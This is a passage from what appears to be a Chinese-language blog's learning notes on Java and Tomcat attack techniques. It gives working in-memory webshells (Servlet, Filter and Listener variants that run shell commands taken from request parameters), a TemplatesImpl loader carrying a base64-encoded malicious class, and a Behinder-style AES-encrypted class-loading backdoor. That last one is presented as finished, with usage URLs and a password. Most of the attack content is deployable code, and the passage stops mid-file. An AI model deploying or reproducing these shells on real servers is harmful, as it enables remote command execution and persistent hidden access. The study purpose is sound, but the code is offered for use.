<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%!

    public class MyServlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("servlet_cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
    MyServlet myServlet = new MyServlet();

%>

<%
    String name = myServlet.getClass().getSimpleName();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setServlet(myServlet);
%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/myservlet",name);
%>

```
## 4.5、验证
在web.xml中没有添加Servlet的情况下，输入路由/myservlet?servlet_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/57d64579-6cf5-410c-a91f-67d0dc857d86.png)

![](https://s3.hedgedoc.org/demo/uploads/a48492aa-e611-4bcd-9236-d40221d17e62.png)

没有弹出记事本，毫无反应

访问实现动态注册的MyServlet.jsp

![](https://s3.hedgedoc.org/demo/uploads/830850f2-cd61-49b3-a4a5-e9a1cb310a7d.png)

再次访问路由/myservlet?servlet_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/d6cc7d76-5ca4-4bdc-85bd-7cd9068d4e95.png)

成功弹出记事本

# 5、总结
Listener内存马：
1. 将我们的Listener添加到applicationEventListenersList中即可

Filter内存马：
1. 设置FilterDef对象，其中包含了Filter的配置属性，然后添加到StandardContext.filterDefs
2. 设置FilteMap对象，其中包含了Filter的映射路由StandardContext.filterMaps
3. 设置ApplicationFilterConfig对象，并将其添加到StandardContext.filterConfigs

Servlet内存马：
1. 设置一个Wrapper对象，其中包含了Servlet的配置属性
2. 将Wrapper添加到StandardContext对象中
3. 在StandardContext中设置Wrapper的访问路由

# 6、完结？
好像还有一个value内存马，在houst中触发的？
不过内存马先暂时告落一段时间
顺便说一下，在学了tomcat基础知识后，就真的好懂了很多
接下来要的去学冰蝎马如何编写的，内存马+冰蝎

# 7、学习
https://blog.csdn.net/weixin_41835612/category_10674061.html

https://xz.aliyun.com/t/10196

https://goodapple.top/archives/1355

http://oceaner.cn/2023/06/11/tomcat-nei-cun-ma/





























































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>TemplatesImpl</title>
    <url>/2023/08/22/TemplatesImpl/</url>
    <content><![CDATA[# TemplatesImpl
## 简述
TemplatesImpl这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码
## 分析
### TemplatesImpl.newTransformer()方法
主要是用来实例化一个TemplatesImpl对象，调用了getTransletInstance()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/422d6e9e-a987-45d2-9db6-d10af1c9e695.png)

 ### TemplatesImpl.getTransletInstance()方法
1. 如果_name=null，就直接返回null，所以_name不能为空
2. 如果_class为null，就去调用defineTransletClasses()方法
3. 然后实例化

这里调用了defineTransletClasses()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/4f49f77b-7f62-4c23-9593-971b7d98d28a.png)

### TemplatesImpl.defineTransletClasses()方法
1. 实例化一个TransletClassLoader对象loader，其中调用了_tfactory.getExternalExtensionsMap()，_tfactory肯定不能为空
2. 调用defineClass()加载_bytecodes
3. 
这里调用了TransletClassLoader类，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/56df4873-c66d-489d-ac76-5a32a1f4fc01.png)

### TemplatesImpl.TransletClassLoader类
其实是TemplatesImpl的一个内部类，它继承ClassLoader父类，重写了defineClass方法

![](https://s3.hedgedoc.org/demo/uploads/da1503f2-f80f-477a-aeb7-29ec31ca8849.png)

### 小结
实例化TemplatesImpl对象，需要给下面的几个成员变量赋值
1. _bytecodes	byte[]对象，字节码，自己定义
2. _name		String对象，类名，随便
3. _tfactory		TransformerFactoryImpl对象，new一个

## 测试
首先准备恶意test类，用于获取恶意字节码
恶意类必须继承AbstractTranslet类

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class test extends AbstractTranslet {
    public test() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

将恶意类的class文件内容base64编码
https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')

![](https://s3.hedgedoc.org/demo/uploads/6f6d9997-0150-47ec-acdd-f611bc6ec7b8.png)

base64内容：

```
yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj

```

再写一个调用类，负责加载这个恶意字节码

```
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;

public class test1 {
    
    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String name, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(object,value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
            TemplatesImpl templates = new TemplatesImpl();
            setValue(templates,"_name","test111");
            setValue(templates,"_bytecodes", new byte[][]{code});
            setValue(templates,"_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

效果：报错，但是不影响我弹计算器

![](https://s3.hedgedoc.org/demo/uploads/42b81fd2-eef1-4d5b-b4ee-a5bb1e64b2a3.png)
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>零碎知识</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat冰蝎内存马</title>
    <url>/2023/08/22/Tomcat%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[# 1、简述
目前打内存马的场景鄙人就遇到了两种
1. 上传jsp文件，然后访问，注入内存马
2. 通过序列化漏洞如log4j2、fastjson直接打进入
不过第二种情况用得比第一种多，直接拿webshell维权

最终的webshell都是放入冰蝎或者哥斯拉等进行管理或者后渗透，所以接下来就将学一下

# 2、冰蝎
这里用Filter举例

首先我们的Filter的jsp内存马子如下：
```
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%-- Filter --%>
<%
    class MyFilter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String commmand = servletRequest.getParameter("filter_cmd");
            if(commmand != null) {
                String osName = System.getProperty("os.name");
                if (osName.toLowerCase().contains("win")) {
                    Runtime.getRuntime().exec(new String[]{"cmd", "/c", commmand});
                } else {
                    Runtime.getRuntime().exec(new String[]{"bash", "-c", commmand});
                }
            }
        }

        @Override
        public void destroy() {
        }
    }

    MyFilter myFilter = new MyFilter();
    String filterName = "lan";
%>

<%-- 获取到StandardContext对象 --%>
<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%-- 创建一个FilterDef对象 --%>
<%
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(myFilter.getClass().getName());
    filterDef.setFilter(myFilter);
    filterDef.setAsyncSupported("true");
%>

<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
<%
    standardContext.addFilterDef(filterDef);
%>

<%-- 创建一个FilteMap对象 --%>
<%
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
%>

<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
<%
    standardContext.addFilterMap(filterMap);
%>

<%-- 获取到ApplicationFilterConfig对象 --%>
<%
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
%>

<%-- 将filter添加到filterConfigs中 --%>
<%
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
    filterConfigs.put(filterName,filterConfig);
%>

```
这里有2个坑:

获取Context对象这里没有用ServletRequest取，而是直接从线程中取的：https://xz.aliyun.com/t/9914

在获取到StandardContext.filterConfigs这个成员变量的时候，用standardContext.getClass().getDeclaredField("filterConfigs")方法无法获取到，要用Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs")才行，搞了好久nnd

效果：

![](https://s3.hedgedoc.org/demo/uploads/886e8d08-6267-425b-807c-2ce01a93990e.png)

![](https://s3.hedgedoc.org/demo/uploads/70642830-e1ab-40b3-a61f-d7008b3a65fc.png)

接着看下冰蝎的jsp马子

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```

看不懂，换行缩进回车一下

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@ page import="sun.misc.BASE64Decoder" %>
<%!
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";
        session.putValue("u",k);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
        String body = request.getReader().readLine();
        BASE64Decoder base64Decoder = new BASE64Decoder();
        byte[] baseDecodeByte = base64Decoder.decodeBuffer(body);
        byte[] aesDecodeByte = c.doFinal(baseDecodeByte);
        U newu = new U(this.getClass().getClassLoader());
        Class classU = newu.g(aesDecodeByte);
        Object newclass = classU.newInstance();
        boolean result = newclass.equals(pageContext);
    }
%>

<% out.print("success!"); %>

```

稍微分析一下

首先对定义一个ClassLoader类，它的方法g()作用是调用ClassLoader.defineClass()方法将传入的byte[]转化为Class对象

![](https://s3.hedgedoc.org/demo/uploads/3903d225-3e35-47a6-ab94-59f41eb8cb3e.png)

然后判断请求的是否为POST请求，如果是，就读取数据包的请求体中的内容，然后Base64+AES解码得到数据码（aesDecodeByte）

![](https://s3.hedgedoc.org/demo/uploads/f0b6a84c-4a3e-4a2b-b082-6f65e0c8cdc2.png)

接着，再将数据码传入到ClassLoader.defineClass()方法中转化为Class对象，最后，调用newInstance()实例化个对象，并调用其恶意对象的equals方法，传入pageContext，结束

![](https://s3.hedgedoc.org/demo/uploads/0358ad1d-6c3f-46cf-b46a-45b8ac09d8c8.png)

然要将冰蝎马与java源码结合，我们就直接将冰蝎马的代码逻辑放入之前写好的Filter内存马（java源码）中

```
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法   http://xxx.xxx.xxx.x/?cmd=whoami
 * 密码：lan
 * 2023/08/03
 */
public class BxieMem lantesta ClassLoader implements Filter{

    String passwd = "73f50c9f17291ce9";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Filter myFilter = new lantesta();
            String filterName = "lan";


            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(myFilter.getClass().getName());
            filterDef.setFilter(myFilter);
            filterDef.setAsyncSupported("true");
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMap(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);

            filterConfigs.put(filterName,filterConfig);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("cmd");
        if (command != null){
            String system = System.getProperty("os.name");
            if (system.toLowerCase().contains("win")) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            } else {
                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
            }
        }

        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                //从java.lang.ClassLoader中获取到Class对象
                Class Lclass = cl.getClass().getSuperclass();
                //调用RushThere()方法，将冰蝎逻辑写入内存马中
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    //下面是冰蝎马子的代码逻辑
    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        //bytecode其实就是冰蝎马中自定义的ClassLoader的class内容，不过被base64编码过后的
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            //获取到ClassLoader.defineClass()方法
            Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            //下面的try，总之就是要获取到类U的Class对象
            try {
                //通过ClassLoader.loadClass()方法获取到类U的Class对象
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                //如果没有找到类U的Class对象，就用ClassLoader.defineClass()方法获取
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            //从类U的Class对象中获取构造方法
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            //获取到当前类的对象
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            //获取类U的方法g()
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = passwd;
            //将密码写入session中
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            //从请求体中获取到base64数据，然后先base64解码，最后aes加密，获取到原始的class数据
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            //通过类U的方法g()，将原始的class数据转化为Class对象eclass
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            //实例化客户端传来的class文件，得到一个Object对象a
            Object a = eclass.newInstance();
            //从对象eclass中获取到方法equals
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            //调用equals对象
            b.invoke(a, pageContext);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    

    @Override
    public void destroy() {

    }
}

```

效果：

![](https://s3.hedgedoc.org/demo/uploads/ab6978a7-e4bc-481f-a849-d79554f4b0fd.png)

![](https://s3.hedgedoc.org/demo/uploads/b506c559-4a2f-473d-b157-b0c9c4a89077.png)

![](https://s3.hedgedoc.org/demo/uploads/c14c29af-d3c4-451a-9e9c-448b29225168.png)

over

# 3、完整代码
## 3.1、java源码
### 3.1.1、Listener
```
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
public class TLbx extends ClassLoader implements ServletRequestListener{

    String passwd = "73f50c9f17291ce9";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
